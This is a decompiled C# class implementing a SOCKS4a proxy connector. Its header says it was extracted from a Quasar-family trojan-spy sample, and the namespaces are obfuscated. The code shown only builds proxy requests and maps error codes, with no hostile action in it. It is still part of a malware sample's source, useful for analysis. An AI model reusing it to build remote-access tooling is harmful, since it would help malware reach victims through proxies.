// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ClientEngine.Proxy.Socks4aConnector
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Net;

namespace NoiseMe.Drags.App.Models.SuperSocket.ClientEngine.Proxy
{
  public class Socks4aConnector : Socks4Connector
  {
    private static Random m_Random = new Random();

    public Socks4aConnector(EndPoint proxyEndPoint, string userID)
      : base(proxyEndPoint, userID)
    {
    }

    public override void Connect(EndPoint remoteEndPoint)
    {
      if (!(remoteEndPoint is MailRy.Net.DnsEndPoint state))
      {
        this.OnCompleted(new ProxyEventArgs(new Exception("The argument 'remoteEndPoint' must be a DnsEndPoint")));
      }
      else
      {
        try
        {
          this.ProxyEndPoint.ConnectAsync((EndPoint) null, new Havens.Models.Local.Extensions.ConnectedCallback(((ProxyConnectorBase) this).ProcessConnect), (object) state);
        }
        catch (Exception ex)
        {
          this.OnException(new Exception("Failed to connect proxy server", ex));
        }
      }
    }

    protected override byte[] GetSendingBuffer(EndPoint targetEndPoint, out int actualLength)
    {
      MailRy.Net.DnsEndPoint dnsEndPoint = targetEndPoint as MailRy.Net.DnsEndPoint;
      byte[] bytes = new byte[Math.Max(8, (string.IsNullOrEmpty(this.UserID) ? 0 : ProxyConnectorBase.ASCIIEncoding.GetMaxByteCount(this.UserID.Length)) + 5 + 4 + ProxyConnectorBase.ASCIIEncoding.GetMaxByteCount(dnsEndPoint.Host.Length) + 1)];
      bytes[0] = (byte) 4;
      bytes[1] = (byte) 1;
      bytes[2] = (byte) (dnsEndPoint.Port / 256);
      bytes[3] = (byte) (dnsEndPoint.Port % 256);
      bytes[4] = (byte) 0;
      bytes[5] = (byte) 0;
      bytes[6] = (byte) 0;
      bytes[7] = (byte) Socks4aConnector.m_Random.Next(1, (int) byte.MaxValue);
      actualLength = 8;
      if (!string.IsNullOrEmpty(this.UserID))
        actualLength += ProxyConnectorBase.ASCIIEncoding.GetBytes(this.UserID, 0, this.UserID.Length, bytes, actualLength);
      bytes[actualLength++] = (byte) 0;
      actualLength += ProxyConnectorBase.ASCIIEncoding.GetBytes(dnsEndPoint.Host, 0, dnsEndPoint.Host.Length, bytes, actualLength);
      bytes[actualLength++] = (byte) 0;
      return bytes;
    }

    protected override void HandleFaultStatus(byte status)
    {
      string empty = string.Empty;
      string exception;
      switch (status)
      {
        case 91:
          exception = "request rejected or failed";
          break;
        case 92:
          exception = "request failed because client is not running identd (or not reachable from the server)";
          break;
        case 93:
          exception = "request failed because client's identd could not confirm the user ID string in the reques";
          break;
        default:
          exception = "request rejected for unknown error";
          break;
      }
      this.OnException(exception);
    }
  }
}
